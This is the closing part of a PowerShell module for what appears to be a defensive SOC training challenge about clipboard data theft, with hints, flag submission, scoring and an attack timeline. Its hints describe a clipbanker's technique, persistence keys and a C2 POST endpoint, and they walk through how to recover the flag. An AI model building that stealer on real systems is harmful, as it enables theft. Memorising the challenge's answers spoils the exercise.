        } elseif ($decoded -match "^1[a-km-zA-HJ-NP-Z1-9]{25,34}$") {
            Write-Host ""
            R "  [!] Decoded value looks like a Bitcoin wallet address!"
            W "      This was in e.carter's clipboard — the clipbanker would have swapped it"
            W "      with attacker wallet: 1NexusAttackerWalletBTC9xQzR3kLmT"
            Write-Host ""
        } else {
            D "  (Try decoding Packet 1 from Get-NetworkCapture)"
        }
    }
    catch {
        R "  [!] Invalid base64 string. Check for typos or extra spaces."
    }
}

# ---------------------------------------------------------------------------
# HINTS
# ---------------------------------------------------------------------------
function Get-Hint {
    param([int]$Level = 0)

    if ($Level -eq 0) {
        Write-Host ""
        C "[ Available Hints — Scenario A: Clipboard Data Theft ]"
        Write-Host ""
        W "  5 hints available. Each hint costs 5 points."
        W "  Current score: $script:Score pts   Hints used: $script:HintsUsed"
        Write-Host ""
        Write-Host ("  {0,-8} {1,-10} {2}" -f "Level","Cost","Description") -ForegroundColor Yellow
        W "  1        -5 pts    Where to start looking (process name)"
        W "  2        -5 pts    What the malware is doing (technique)"
        W "  3        -5 pts    Where to find the decoded commands"
        W "  4        -5 pts    Both persistence mechanisms"
        W "  5        -5 pts    Exactly how to find and decode the flag"
        Write-Host ""
        Y "  Usage: Get-Hint -Level 1"
        Write-Host ""
        return
    }

    $hints = @{
        1 = @{
            Title = "Where to Start"
            Text  = @(
                "Run Get-ProcessList first."
                "Look for a process named RuntimeBroker.exe."
                "The REAL one lives in C:\Windows\System32\  — "
                "The fake one is hiding in  C:\Users\...\AppData\Roaming\Microsoft\Windows\Themes\"
                "A process in AppData consuming 8.7% CPU with outbound connections is very suspicious."
            )
        }
        2 = @{
            Title = "The Technique"
            Text  = @(
                "This is MITRE T1115 — Clipboard Data."
                "The malware loaded the .NET assembly 'PresentationCore'"
                "and called [Windows.Clipboard]::GetText() in a while loop."
                "Every 3 seconds it reads the clipboard, base64-encodes the content,"
                "and POST it to http://45.33.32.156/c"
                "Run Get-EventPowerShell to see the exact decoded command."
            )
        }
        3 = @{
            Title = "Finding the Decoded Commands"
            Text  = @(
                "Windows logs every PowerShell script in Event ID 4104"
                "(ScriptBlock logging — even -EncodedCommand gets decoded here)."
                "Run: Get-EventPowerShell"
                "You'll see three script blocks:"
                "  1. IEX download from C2"
                "  2. The clipboard monitoring while loop"
                "  3. The BTC wallet address swapper (clipbanker)"
            )
        }
        4 = @{
            Title = "Both Persistence Mechanisms"
            Text  = @(
                "The malware uses TWO persistence methods:"
                ""
                "1. Registry Run Key (T1547.001):"
                "   HKCU\Software\Microsoft\Windows\CurrentVersion\Run\RuntimeBrokerSvc"
                "   → Run Get-RegistryRun to confirm"
                ""
                "2. Scheduled Task (T1053.005):"
                "   \Microsoft\Windows\UpdateOrchestrator\RuntimeBrokerUpdate"
                "   → Run Get-ScheduledTasks to confirm"
            )
        }
        5 = @{
            Title = "How to Find the Flag"
            Text  = @(
                "Run Get-NetworkCapture to see the captured C2 POST requests."
                "Look at Packet 1 — the POST body is base64-encoded clipboard content."
                "Emily Carter had the flag in her clipboard at 09:24 when the malware fired."
                ""
                "Copy the base64 string from Packet 1 and run:"
                "  Decode-Base64 -S '<paste the string here>'"
                ""
                "The decoded value is the flag. Then run Submit-Flag to complete the challenge."
            )
        }
    }

    if (-not $hints.ContainsKey($Level)) {
        R "  [!] Invalid hint level. Use 1–5."
        return
    }

    $script:HintsUsed++
    $script:Score = [Math]::Max(0, $script:Score - 5)

    Write-Host ""
    Y "════════════ Hint $Level of 5 — $($hints[$Level].Title) ════════════"
    Write-Host ""
    foreach ($line in $hints[$Level].Text) {
        if ($line -eq "") { Write-Host "" }
        else { W "  $line" }
    }
    Write-Host ""
    D "  Score after hint: $script:Score pts  (hints used: $script:HintsUsed)"
    Write-Host ""
}

# ---------------------------------------------------------------------------
# SUBMIT FLAG
# ---------------------------------------------------------------------------
function Submit-Flag {
    param([string]$Flag = "")

    if ($Flag -eq "") {
        Y "  Usage: Submit-Flag 'NFCSOC{...}'"
        return
    }

    Write-Host ""
    if ($Flag.Trim() -eq $script:FLAG) {
        $script:FLAG_FOUND = $true
        $script:Steps.Add("submitted") | Out-Null

        Write-Host "  ╔══════════════════════════════════════════════════════════════════╗" -ForegroundColor Green
        Write-Host "  ║                                                                  ║" -ForegroundColor Green
        Write-Host "  ║    ██████╗ ██╗      █████╗  ██████╗                             ║" -ForegroundColor Green
        Write-Host "  ║    ██╔══██╗██║     ██╔══██╗██╔════╝                             ║" -ForegroundColor Green
        Write-Host "  ║    ██████╔╝██║     ███████║██║  ███╗                            ║" -ForegroundColor Green
        Write-Host "  ║    ██╔══██╗██║     ██╔══██║██║   ██║                            ║" -ForegroundColor Green
        Write-Host "  ║    ██║  ██║███████╗██║  ██║╚██████╔╝                            ║" -ForegroundColor Green
        Write-Host "  ║                                                                  ║" -ForegroundColor Green
        Write-Host "  ║    SCENARIO A COMPLETE — CLIPBOARD DATA THEFT                   ║" -ForegroundColor Green
        Write-Host "  ║                                                                  ║" -ForegroundColor Green
        Write-Host "  ║    Flag: $($script:FLAG)                       ║" -ForegroundColor Yellow
        Write-Host "  ║                                                                  ║" -ForegroundColor Green
        Write-Host "  ╚══════════════════════════════════════════════════════════════════╝" -ForegroundColor Green
        Write-Host ""

        $stepsTotal = 7
        $stepsFound = ($script:Steps | Where-Object { $_ -in @("processes","network","sysmon","security_events","powershell_4104","registry","tasks","capture","flag_decoded") }).Count
        Write-Host "  FINAL SCORE: $script:Score / 100 pts" -ForegroundColor $(if ($script:Score -ge 80) {"Green"} elseif ($script:Score -ge 50) {"Yellow"} else {"Red"})
        Write-Host "  Hints used : $script:HintsUsed" -ForegroundColor White
        Write-Host "  Steps done : $stepsFound / $stepsTotal investigation commands run" -ForegroundColor White
        Write-Host ""
        C "  ATTACK SUMMARY — Clipboard Data Theft"
        Write-Host ""
        W "  09:11  e.carter received phishing email from nexusfinancial-update.com"
        W "  09:12  Opened Payroll_Update_Nov2024.docm → macro ran hidden PowerShell"
        W "  09:12  PowerShell downloaded payload → dropped RuntimeBroker.exe in Themes\"
        W "  09:12  Registry Run key set: HKCU\...\Run\RuntimeBrokerSvc"
        W "  09:13  Scheduled task created: every 5 minutes"
        W "  09:12  Clipboard monitoring loop started (PresentationCore + while loop)"
        W "  09:24  First clipboard contents POSTed to 45.33.32.156 (the flag was in clipboard)"
        W "  09:35  BTC clipbanker activated — swap crypto wallet addresses silently"
        Write-Host ""
        Y "  MITRE ATT&CK:"
        D "    T1566.001  Spearphishing Attachment"
        D "    T1059.001  PowerShell"
        D "    T1105      Ingress Tool Transfer (IEX download)"
        D "    T1547.001  Registry Run Keys (persistence)"
        D "    T1053.005  Scheduled Task (persistence)"
        D "    T1115      Clipboard Data (exfiltration)"
        D "    T1041      Exfiltration Over C2 Channel"
        Write-Host ""
        G "  Well done. Check CTF.md in the immersivelaps-exam folder for more scenarios."
        Write-Host ""
    } else {
        R "  [!] Incorrect flag. Check your decoding and try again."
        D "      Format: NFCSOC{...}"
        D "      Hint: Run Get-NetworkCapture and decode Packet 1's POST body"
        Write-Host ""
    }
}

# ---------------------------------------------------------------------------
# SCORE
# ---------------------------------------------------------------------------
function Get-Score {
    Write-Host ""
    C "[ Investigation Progress — Scenario A ]"
    Write-Host ""

    $checks = [ordered]@{
        "processes"       = "Get-ProcessList         — Suspicious RuntimeBroker.exe"
        "network"         = "Get-NetworkConn         — C2 beaconing to 45.33.32.156"
        "security_events" = "Get-EventSecurity       — Process creation chain"
        "sysmon"          = "Get-EventSysmon         — File drop, registry, DLL load"
        "powershell_4104" = "Get-EventPowerShell     — ScriptBlock logs (4104)"
        "registry"        = "Get-RegistryRun         — Run key persistence"
        "tasks"           = "Get-ScheduledTasks      — Scheduled task persistence"
        "capture"         = "Get-NetworkCapture      — C2 POST data captured"
        "flag_decoded"    = "Decode-Base64           — Flag decoded from C2 traffic"
        "submitted"       = "Submit-Flag             — Challenge complete"
    }

    foreach ($k in $checks.Keys) {
        if ($script:Steps.Contains($k)) {
            Write-Host "  [X] $($checks[$k])" -ForegroundColor Green
        } else {
            Write-Host "  [ ] $($checks[$k])" -ForegroundColor DarkGray
        }
    }

    Write-Host ""
    $done = ($checks.Keys | Where-Object { $script:Steps.Contains($_) }).Count
    Write-Host "  Score : $script:Score / 100 pts" -ForegroundColor $(if ($script:Score -ge 80) {"Green"} elseif ($script:Score -ge 50) {"Yellow"} else {"Red"})
    Write-Host "  Steps : $done / $($checks.Count) completed" -ForegroundColor White
    Write-Host "  Hints : $script:HintsUsed used" -ForegroundColor White
    Write-Host ""

    if (-not $script:FLAG_FOUND) {
        $remaining = $checks.Keys | Where-Object { -not $script:Steps.Contains($_) } | Select-Object -First 1
        if ($remaining) {
            Y "  Next uncompleted step:"
            W "    $($checks[$remaining])"
            Write-Host ""
        }
    }
}

Export-ModuleMember -Function @(
    'Show-Banner','Start-Scenario','Get-SOCHelp',
    'Get-ProcessList','Get-NetworkConn',
    'Get-EventSecurity','Get-EventSysmon','Get-EventPowerShell',
    'Get-RegistryRun','Get-ScheduledTasks','Get-FileInfo',
    'Get-NetworkCapture','Decode-Base64',
    'Get-Hint','Submit-Flag','Get-Score'
)
